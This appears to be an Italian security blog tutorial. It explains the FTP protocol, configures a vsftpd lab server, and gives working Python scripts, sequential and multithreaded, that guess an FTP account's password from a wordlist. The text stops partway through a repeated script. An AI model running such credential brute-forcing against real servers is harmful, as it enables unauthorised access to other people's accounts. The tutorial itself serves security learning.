@@ -1,0 +1,543 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Brute Force di un Server FTP :: HomePage</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Table Of Contents:
+ Basi sul Protocollo FTP Configurazione di un Server FTP con Vsftpd Brute Forcing delle credenziali di un server FTP con Python Prova sul Campo   In questo post andrò a spiegare come è possibile creare uno script per fare il brute forcing delle credenziali (in particolare la password) di un server FTP. Prima di tutto facciamo chiarezza su cos&amp;rsquo;è il protocollo FTP.
+Basi sul Protocollo FTP Ftp è l’acronimo di File Transfer Protocol esso è un protocollo che permette di trasferire un file dalla rete al singolo client (server) e viceversa, esso però permette anche la navigazione veloce nella struttura di un server web dove sono presenti file." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://kobra3390.github.io/SpaceHack/posts/brute-force-ftp-server/brute_force_server_ftp/" />
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="https://kobra3390.github.io/SpaceHack/styles.css">
+
+
+
+
+
+
+
+  <link rel="shortcut icon" href="https://kobra3390.github.io/SpaceHack/spacehack.ico">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="Autore: k0Br@3390" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Brute Force di un Server FTP">
+<meta property="og:description" content="Table Of Contents:
+ Basi sul Protocollo FTP Configurazione di un Server FTP con Vsftpd Brute Forcing delle credenziali di un server FTP con Python Prova sul Campo   In questo post andrò a spiegare come è possibile creare uno script per fare il brute forcing delle credenziali (in particolare la password) di un server FTP. Prima di tutto facciamo chiarezza su cos&amp;rsquo;è il protocollo FTP.
+Basi sul Protocollo FTP Ftp è l’acronimo di File Transfer Protocol esso è un protocollo che permette di trasferire un file dalla rete al singolo client (server) e viceversa, esso però permette anche la navigazione veloce nella struttura di un server web dove sono presenti file." />
+<meta property="og:url" content="https://kobra3390.github.io/SpaceHack/posts/brute-force-ftp-server/brute_force_server_ftp/" />
+<meta property="og:site_name" content="HomePage" />
+
+  
+    <meta property="og:image" content="https://kobra3390.github.io/SpaceHack/spacehack.ico">
+  
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+  <meta property="article:section" content="Tutorial" />
+
+  <meta property="article:section" content="Network Attacks" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="https://kobra3390.github.io/SpaceHack/">
+  <div class="logo">
+    SpaceHack
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="https://kobra3390.github.io/SpaceHack/about">About</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="https://kobra3390.github.io/SpaceHack/about">About</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  
+  <div id="search" style="margin-left: 10px;margin-top: 20px;">
+    <input id="searchInput" tabindex="0">
+    <button id="searchButton">Search</button>
+    <ul id="searchResults">
+    </ul>
+  </div>
+  <script src="https://kobra3390.github.io/SpaceHack/js/fuse.js"></script> 
+  <script src="https://kobra3390.github.io/SpaceHack/js/search.js"></script>
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="https://kobra3390.github.io/SpaceHack/posts/brute-force-ftp-server/brute_force_server_ftp/">Brute Force di un Server FTP</a>
+  </h1>
+  <div class="post-meta">
+    
+    
+      <span class="post-author">Autore: k0Br@3390</span>
+    
+    
+      <span class="post-reading-time">:: 12 min read (2348 words)</span>
+    
+  </div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="https://kobra3390.github.io/SpaceHack/tags/protocollo-ftp/">Protocollo FTP</a>&nbsp;
+      
+      #<a href="https://kobra3390.github.io/SpaceHack/tags/brute-force/">Brute Force</a>&nbsp;
+      
+      #<a href="https://kobra3390.github.io/SpaceHack/tags/python/">Python</a>&nbsp;
+      
+      #<a href="https://kobra3390.github.io/SpaceHack/tags/vsftpd/">vsftpd</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <p><strong>Table Of Contents</strong>:</p>
+<ul>
+<li><a href="#basi-sul-protocollo-ftp">Basi sul Protocollo FTP</a></li>
+<li><a href="#configurazione-di-un-server-ftp-con-vsftpd">Configurazione di un Server FTP con Vsftpd</a></li>
+<li><a href="#brute-forcing-delle-credenziali-di-un-server-ftp-con-python">Brute Forcing delle credenziali di un server FTP con Python</a></li>
+<li><a href="#prova-sul-campo">Prova sul Campo</a></li>
+</ul>
+<hr>
+<p>In questo post andrò a spiegare come è possibile creare uno script per fare il brute forcing delle credenziali (in particolare la password) di un server FTP. Prima di tutto facciamo chiarezza su cos&rsquo;è il protocollo FTP.</p>
+<h1 id="basi-sul-protocollo-ftp">Basi sul Protocollo FTP<a href="#basi-sul-protocollo-ftp" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Ftp è l’acronimo di File Transfer Protocol esso è un protocollo che permette di trasferire un file dalla rete al singolo client (server) e viceversa, esso però permette anche la navigazione veloce nella struttura di un server web dove sono presenti file. É uno dei protocolli più vecchi di Internet. Già a partire dal 1974 si inizia a lavorare con la tecnologia di trasmissione dei file completi. Nel 1985 si definisce con esattezza il FTP nel documento Request For Comments 959. Il protocollo ftp è un protocollo indipendente quindi è possibile usarlo su qualsiasi computer, indipendentemente dal sistema operativo che vi si usa. Questo servizio viene usato anche nella posta odierna, questo perché, anche essendo un protocollo datato permette il trasferimento di file di notevoli dimensioni. C’è una distinzione da fare tra ftp pubblico e ftp privato:</p>
+<ul>
+<li>
+<p><strong>ftp pubblico</strong>: viene definito tale quando un client esegue il download su un sito web, o su un qualsiasi sito che permette di scaricare file durante la navigazione in questo caso può essere chiamato anche anonymous ftp.</p>
+</li>
+<li>
+<p><strong>ftp privato</strong>: se ad esempio un provider mette a disposizione uno spazio web, directory comprese per fare il download e upload dei file html esso viene definito ftp privato o full service ftp.</p>
+</li>
+</ul>
+<p>Il File Transfer Protocol viene eseguito all’interno del livello applicativo dello stack TCP/IP, ossia nello stesso livello di HTTP o POP. Questi protocolli si caratterizzano per il loro funzionamento in combinazione con i programmi, come browser o client di posta elettronica, grazie ai quali svolgono la propria funzione. Anche per il File Transfer Protocol esistono dei software FTP dedicati.
+Per stabilire una connessione FTP vengono aperti due canali. Per prima cosa client e server creano un canale di controllo tramite la porta 21, tramite il quale il client invia comandi al server e questo risponde con i codici di stato. Dopodiché entrambi possono creare un canale dati che trasporta i file desiderati da una parte all’altra. Il protocollo controlla eventuali errori.</p>
+<p>È necessario distinguere però tra FTP attivo e passivo. Nella variante attiva è il client a stabilire la connessione, come spiegato, attraverso la porta 21 e a comunicare al server su quale porta lato cliente questo può inviare la propria risposta. Ma se il client è protetto da un firewall, allora il server non potrà inviare alcuna risposta in quanto tutte le connessioni esterne sono bloccate. Proprio per questi casi è stata sviluppata una modalità passiva, che prevede che sia il server a rendere nota la porta tramite la quale il client può creare il canale dati. In questo modo, essendo il client a iniziare la connessione, il firewall non blocca il trasferimento dei dati.
+Il File Transfer Protocol dispone di vari comandi e codici di stato. Grazie a ben 32 comandi totali - non sempre necessariamente tutti implementati dal server - il client istruisce il server su qual è l’operazione desiderata:</p>
+<ul>
+<li>caricare o scaricare file</li>
+<li>organizzare cartelle</li>
+<li>cancellare file</li>
+</ul>
+<p>Il server risponde ogni volta con un codice di stato che serve a informare se il comando può essere eseguito o meno con successo.
+Il File Transfer Protocol originale venne creato senza misure di sicurezza preventive. All’epoca Internet era ancora molto piccolo e la cybercriminalità non esisteva ancora. Ma col passare del tempo i rischi di sicurezza associati all’utilizzo del FTP sono diventati numerosi, venendo le informazioni trasmesse senza essere state precedentemente criptate.</p>
+<p>Perciò sono state sviluppate due varianti sicure, che da allora continuano a farsi concorrenza: FTPS e SFTP. La prima variante consiste nel FTP over SSL. La connessione viene stabilita utilizzando i Secure Socket Layers (SSL), ossia il Transport Layer Security (TLS), che serve a criptare lo scambio di dati.<br>
+Il SSH File Transfer Protocol (SFTP), al contrario, utilizza il Secure Shell (SSH) per garantire una trasmissione sicura dei dati.</p>
+<p>Anche in questo caso la connessione è criptata. Ma mentre il FTPS necessita di due connessioni, al SFTP ne basta una sola. In compenso però bisogna utilizzare un programma aggiuntivo.
+Vsftpd (acronimo di Very Secure FTP daemon) è un server FTP per sistemi simili a Unix, incluso Linux. È il server FTP predefinito nelle distribuzioni Linux Ubuntu, CentOS, Fedora, NimbleX, Slackware e RHEL. È concesso in licenza con GNU General Public License, supporta IPv6, TLS e FTPS.</p>
+<p>Ora che abbiamo compreso cos&rsquo;è il protocollo FTP e a cosa serve, andiamo a vedere come configurare un server FTP con Linux.</p>
+<h1 id="configurazione-di-un-server-ftp-con-vsftpd">Configurazione di un Server FTP con Vsftpd<a href="#configurazione-di-un-server-ftp-con-vsftpd" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Il pacchetto vsftpd è disponibile nei repository standard. Esegui i seguenti comandi per installarlo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo apt update
+$ sudo apt install vsftpd
+</code></pre></div><p>Al termine dell&rsquo;installazione, il servizio ftp verrà avviato automaticamente.  Stampa lo stato del servizio per confermare:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo systemctl status vsftpd
+</code></pre></div><p>È possibile configurare il server vsftpd modificando il file <code>/etc/vsftpd.conf</code>. Il file di configurazione contiene la documentazione dettagliata per la maggior parte delle impostazioni. Visita la pagina ufficiale vsftpd per vedere tutte le opzioni disponibili.
+Per iniziare, apri il file di configurazione vsftpd:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo nano /etc/vsftpd.conf
+</code></pre></div><p>Per assicurarti che solo gli utenti locali possano connettersi al server FTP, cerca le direttive anonymous_enable e local_enable e assicurati che le tue impostazioni corrispondano alle seguenti righe:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">anonymous_enable<span style="color:#f92672">=</span>NO
+local_enable<span style="color:#f92672">=</span>YES
+</code></pre></div><p>Creeremo un nuovo utente per testare il server FTP. Crea un nuovo utente chiamato newftpuser:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo adduser newftpuser
+</code></pre></div><p>Impostare la password utente quando richiesto. Aggiungere l&rsquo;utente all&rsquo;elenco degli utenti FTP consentiti:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo <span style="color:#e6db74">&#34;newftpuser&#34;</span> | sudo tee -a /etc/vsftpd.user_list
+</code></pre></div><p>Crea l&rsquo;albero della directory FTP e imposta le autorizzazioni corrette:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo mkdir -p /home/newftpuser/ftp/upload
+$ sudo chmod <span style="color:#ae81ff">550</span> /home/newftpuser/ftp
+$ sudo chmod <span style="color:#ae81ff">750</span> /home/newftpuser/ftp/upload
+$ sudo chown -R newftpuser: /home/newftpuser/ftp
+</code></pre></div><p>Per il nostro fine vanno bene queste configurazioni, ma il file <code>/etc/vsftpd.conf</code> ne ha moltre altre, quindi invito chi fosse interessato ad approfondire meglio l&rsquo;argomento.</p>
+<h1 id="brute-forcing-delle-credenziali-di-un-server-ftp-con-python">Brute Forcing delle credenziali di un server FTP con Python<a href="#brute-forcing-delle-credenziali-di-un-server-ftp-con-python" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Useremo il modulo ftplib integrato in Python. Tuttavia, useremo colorama per stampare a colori in Python:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">pip3 install colorama
+</code></pre></div><p>Inizia a scrivere il codice:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> ftplib
+<span style="color:#f92672">from</span> colorama <span style="color:#f92672">import</span> Fore, init <span style="color:#75715e"># for fancy colors, nothing else</span>
+
+<span style="color:#75715e"># init the console for colors (Windows)</span>
+<span style="color:#75715e"># init()</span>
+<span style="color:#75715e"># hostname or IP address of the FTP server</span>
+host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;192.168.1.113&#34;</span>
+<span style="color:#75715e"># username of the FTP server, root as default for linux</span>
+user <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;test&#34;</span>
+<span style="color:#75715e"># port of FTP, aka 21</span>
+port <span style="color:#f92672">=</span> <span style="color:#ae81ff">21</span>
+</code></pre></div><p>Quindi il server locale si trova a 192.168.1.113, ho creato anche un nome utente &ldquo;test&rdquo;, e poi specifichiamo la porta dell&rsquo;FTP, che è la 21.</p>
+<p>Ora scriviamo la funzione principale che accetta una password negli argomenti e restituisce se le credenziali sono corrette:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">is_correct</span>(password):
+    <span style="color:#75715e"># initialize the FTP server object</span>
+    server <span style="color:#f92672">=</span> ftplib<span style="color:#f92672">.</span>FTP()
+    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[!] Trying&#34;</span>, password)
+    <span style="color:#66d9ef">try</span>:
+        <span style="color:#75715e"># tries to connect to FTP server with a timeout of 5</span>
+        server<span style="color:#f92672">.</span>connect(host, port, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span>)
+        <span style="color:#75715e"># login using the credentials (user &amp; password)</span>
+        server<span style="color:#f92672">.</span>login(user, password)
+    <span style="color:#66d9ef">except</span> ftplib<span style="color:#f92672">.</span>error_perm:
+        <span style="color:#75715e"># login failed, wrong credentials</span>
+        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+    <span style="color:#66d9ef">else</span>:
+        <span style="color:#75715e"># correct credentials</span>
+        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>Fore<span style="color:#f92672">.</span>GREEN<span style="color:#e6db74">}</span><span style="color:#e6db74">[+] Found credentials:&#34;</span>, password, Fore<span style="color:#f92672">.</span>RESET)
+        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
+</code></pre></div><p>Niente di speciale; inizializziamo l&rsquo;oggetto server FTP usando ftplib.FTP() e poi ci connettiamo a quell&rsquo;host e proviamo ad accedere, questo solleverà un&rsquo;eccezione ogni volta che le credenziali non sono corrette, quindi se viene sollevata, restituiremo solo False e True altrimenti.</p>
+<p>Useremo un elenco di password conosciute. Sentiti libero di usarne uno qualsiasi, oppure puoi generare il tuo elenco di parole personalizzato usando Crunch. Tuttavia, utilizzeremo l&rsquo;elenco delle password di Nmap che contiene circa 5000 password. Se sei su Kali Linux, si trova in &ldquo;/usr/share/wordlists/nmap.lst&rdquo;. Altrimenti, prendilo <a href="https://github.com/x4nth055/pythoncode-tutorials/blob/master/ethical-hacking/ftp-cracker/wordlist.txt">qui</a>.</p>
+<p>Una volta che lo hai, mettilo nella directory corrente e chiamalo wordlist.txt e usa il seguente codice:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># read the wordlist of passwords</span>
+passwords <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;wordlist.txt&#34;</span>)<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+print(<span style="color:#e6db74">&#34;[+] Passwords to try:&#34;</span>, len(passwords))
+</code></pre></div><p>Ora tutto ciò che dobbiamo fare è eseguire la funzione di cui sopra su tutte queste password:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># iterate over passwords one by one</span>
+<span style="color:#75715e"># if the password is found, break out of the loop</span>
+<span style="color:#66d9ef">for</span> password <span style="color:#f92672">in</span> passwords:
+    <span style="color:#66d9ef">if</span> is_correct(password):
+        <span style="color:#66d9ef">break</span>
+</code></pre></div><p>Ora, questo codice va bene, ma è molto lento. Utilizza un solo thread che tenta in sequenza una connessione FTP su ciascuna password.</p>
+<p>Usiamo i thread per accelerare questo processo; il seguente codice è quello completo che utilizza il multi-threading:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> ftplib
+<span style="color:#f92672">from</span> threading <span style="color:#f92672">import</span> Thread
+<span style="color:#f92672">import</span> queue
+<span style="color:#f92672">from</span> colorama <span style="color:#f92672">import</span> Fore, init <span style="color:#75715e"># for fancy colors, nothing else</span>
+
+<span style="color:#75715e"># init the console for colors (for Windows)</span>
+<span style="color:#75715e"># init()</span>
+<span style="color:#75715e"># initialize the queue</span>
+q <span style="color:#f92672">=</span> queue<span style="color:#f92672">.</span>Queue()
+<span style="color:#75715e"># number of threads to spawn</span>
+n_threads <span style="color:#f92672">=</span> <span style="color:#ae81ff">30</span>
+<span style="color:#75715e"># hostname or IP address of the FTP server</span>
+host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;192.168.1.113&#34;</span>
+<span style="color:#75715e"># username of the FTP server, root as default for linux</span>
+user <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;test&#34;</span>
+<span style="color:#75715e"># port of FTP, aka 21</span>
+port <span style="color:#f92672">=</span> <span style="color:#ae81ff">21</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">connect_ftp</span>():
+    <span style="color:#66d9ef">global</span> q
+    <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+        <span style="color:#75715e"># get the password from the queue</span>
+        password <span style="color:#f92672">=</span> q<span style="color:#f92672">.</span>get()
+        <span style="color:#75715e"># initialize the FTP server object</span>
+        server <span style="color:#f92672">=</span> ftplib<span style="color:#f92672">.</span>FTP()
+        print(<span style="color:#e6db74">&#34;[!] Trying&#34;</span>, password)
+        <span style="color:#66d9ef">try</span>:
+            <span style="color:#75715e"># tries to connect to FTP server with a timeout of 5</span>
+            server<span style="color:#f92672">.</span>connect(host, port, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span>)
+            <span style="color:#75715e"># login using the credentials (user &amp; password)</span>
+            server<span style="color:#f92672">.</span>login(user, password)
+        <span style="color:#66d9ef">except</span> ftplib<span style="color:#f92672">.</span>error_perm:
+            <span style="color:#75715e"># login failed, wrong credentials</span>
+            <span style="color:#66d9ef">pass</span>
+        <span style="color:#66d9ef">else</span>:
+            <span style="color:#75715e"># correct credentials</span>
+            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>Fore<span style="color:#f92672">.</span>GREEN<span style="color:#e6db74">}</span><span style="color:#e6db74">[+] Found credentials: &#34;</span>)
+            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Host: </span><span style="color:#e6db74">{</span>host<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">User: </span><span style="color:#e6db74">{</span>user<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Password: </span><span style="color:#e6db74">{</span>password<span style="color:#e6db74">}{</span>Fore<span style="color:#f92672">.</span>RESET<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+            <span style="color:#75715e"># we found the password, let&#39;s clear the queue</span>
+            <span style="color:#66d9ef">with</span> q<span style="color:#f92672">.</span>mutex:
+                q<span style="color:#f92672">.</span>queue<span style="color:#f92672">.</span>clear()
+                q<span style="color:#f92672">.</span>all_tasks_done<span style="color:#f92672">.</span>notify_all()
+                q<span style="color:#f92672">.</span>unfinished_tasks <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+        <span style="color:#66d9ef">finally</span>:
+            <span style="color:#75715e"># notify the queue that the task is completed for this password</span>
+            q<span style="color:#f92672">.</span>task_done()
+
+<span style="color:#75715e"># read the wordlist of passwords</span>
+passwords <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;wordlist.txt&#34;</span>)<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+print(<span style="color:#e6db74">&#34;[+] Passwords to try:&#34;</span>, len(passwords))
+<span style="color:#75715e"># put all passwords to the queue</span>
+<span style="color:#66d9ef">for</span> password <span style="color:#f92672">in</span> passwords:
+    q<span style="color:#f92672">.</span>put(password)
+<span style="color:#75715e"># create `n_threads` that runs that function</span>
+<span style="color:#66d9ef">for</span> t <span style="color:#f92672">in</span> range(n_threads):
+    thread <span style="color:#f92672">=</span> Thread(target<span style="color:#f92672">=</span>connect_ftp)
+    <span style="color:#75715e"># will end when the main thread end</span>
+    thread<span style="color:#f92672">.</span>daemon <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+    thread<span style="color:#f92672">.</span>start()
+<span style="color:#75715e"># wait for the queue to be empty</span>
+q<span style="color:#f92672">.</span>join()
+</code></pre></div><p>Fantastico, è abbastanza simile al precedente, ma qui stiamo usando una coda che all&rsquo;inizio è riempita con l&rsquo;elenco delle password, e nella funzione principale che viene eseguita da quei thread daemon, otteniamo una password dal coda e prova ad accedere con esso. Se la password è corretta, dobbiamo terminare la forzatura bruta, un modo sicuro per farlo è cancellare la coda, ed è quello che stiamo facendo.</p>
+<p>Abbiamo anche utilizzato i thread daemon, quindi questi thread termineranno al termine del thread principale.</p>
+<p>Ecco il codice completo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> ftplib
+<span style="color:#f92672">from</span> colorama <span style="color:#f92672">import</span> Fore, init <span style="color:#75715e"># for fancy colors, nothing else</span>
+
+<span style="color:#75715e"># init the console for colors (for Windows)</span>
+init()
+<span style="color:#75715e"># hostname or IP address of the FTP server</span>
+host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;192.168.1.113&#34;</span>
+<span style="color:#75715e"># username of the FTP server, root as default for linux</span>
+user <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;test&#34;</span>
+<span style="color:#75715e"># port of FTP, aka 21</span>
+port <span style="color:#f92672">=</span> <span style="color:#ae81ff">21</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">is_correct</span>(password):
+    <span style="color:#75715e"># initialize the FTP server object</span>
+    server <span style="color:#f92672">=</span> ftplib<span style="color:#f92672">.</span>FTP()
+    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[!] Trying&#34;</span>, password)
+    <span style="color:#66d9ef">try</span>:
+        <span style="color:#75715e"># tries to connect to FTP server with a timeout of 5</span>
+        server<span style="color:#f92672">.</span>connect(host, port, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span>)
+        <span style="color:#75715e"># login using the credentials (user &amp; password)</span>
+        server<span style="color:#f92672">.</span>login(user, password)
+    <span style="color:#66d9ef">except</span> ftplib<span style="color:#f92672">.</span>error_perm:
+        <span style="color:#75715e"># login failed, wrong credentials</span>
+        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+    <span style="color:#66d9ef">else</span>:
+        <span style="color:#75715e"># correct credentials</span>
+        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>Fore<span style="color:#f92672">.</span>GREEN<span style="color:#e6db74">}</span><span style="color:#e6db74">[+] Found credentials:&#34;</span>, password, Fore<span style="color:#f92672">.</span>RESET)
+        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
+
+<span style="color:#75715e"># read the wordlist of passwords</span>
+passwords <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;wordlist.txt&#34;</span>)<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+print(<span style="color:#e6db74">&#34;[+] Passwords to try:&#34;</span>, len(passwords))
+
+<span style="color:#75715e"># iterate over passwords one by one</span>
+<span style="color:#75715e"># if the password is found, break out of the loop</span>
+<span style="color:#66d9ef">for</span> password <span style="color:#f92672">in</span> passwords:
+    <span style="color:#66d9ef">if</span> is_correct(password):
+        <span style="color:#66d9ef">break</span>
+</code></pre></div><p>Ecco invece l’esempio piú complesso:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> ftplib
+<span style="color:#f92672">from</span> threading <span style="color:#f92672">import</span> Thread
+<span style="color:#f92672">import</span> queue
+<span style="color:#f92672">from</span> colorama <span style="color:#f92672">import</span> Fore, init <span style="color:#75715e"># for fancy colors, nothing else</span>
+
+<span style="color:#75715e"># init the console for colors (for Windows)</span>
+<span style="color:#75715e"># init()</span>
+<span style="color:#75715e"># initialize the queue</span>
+q <span style="color:#f92672">=</span> queue<span style="color:#f92672">.</span>Queue()
+<span style="color:#75715e"># number of threads to spawn</span>
+n_threads <span style="color:#f92672">=</span> <span style="color:#ae81ff">30</span>
+
+<span style="color:#75715e"># hostname or IP address of the FTP server</span>
+host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;192.168.1.113&#34;</span>
+<span style="color:#75715e"># username of the FTP server, root as default for linux</span>
+user <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;test&#34;</span>
+<span style="color:#75715e"># port of FTP, aka 21</span>
+port <span style="color:#f92672">=</span> <span style="color:#ae81ff">21</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">connect_ftp</span>():
+    <span style="color:#66d9ef">global</span> q
+    <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+        <span style="color:#75715e"># get the password from the queue</span>
+        password <span style="color:#f92672">=</span> q<span style="color:#f92672">.</span>get()
+        <span style="color:#75715e"># initialize the FTP server object</span>
+        server <span style="color:#f92672">=</span> ftplib<span style="color:#f92672">.</span>FTP()
+        print(<span style="color:#e6db74">&#34;[!] Trying&#34;</span>, password)
+        <span style="color:#66d9ef">try</span>:
+            <span style="color:#75715e"># tries to connect to FTP server with a timeout of 5</span>
+            server<span style="color:#f92672">.</span>connect(host, port, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span>)
+            <span style="color:#75715e"># login using the credentials (user &amp; password)</span>
+            server<span style="color:#f92672">.</span>login(user, password)
+        <span style="color:#66d9ef">except</span> ftplib<span style="color:#f92672">.</span>error_perm:
+            <span style="color:#75715e"># login failed, wrong credentials</span>
+            <span style="color:#66d9ef">pass</span>
+        <span style="color:#66d9ef">else</span>:
+            <span style="color:#75715e"># correct credentials</span>
+            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>Fore<span style="color:#f92672">.</span>GREEN<span style="color:#e6db74">}</span><span style="color:#e6db74">[+] Found credentials: &#34;</span>)
+            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Host: </span><span style="color:#e6db74">{</span>host<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">User: </span><span style="color:#e6db74">{</span>user<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
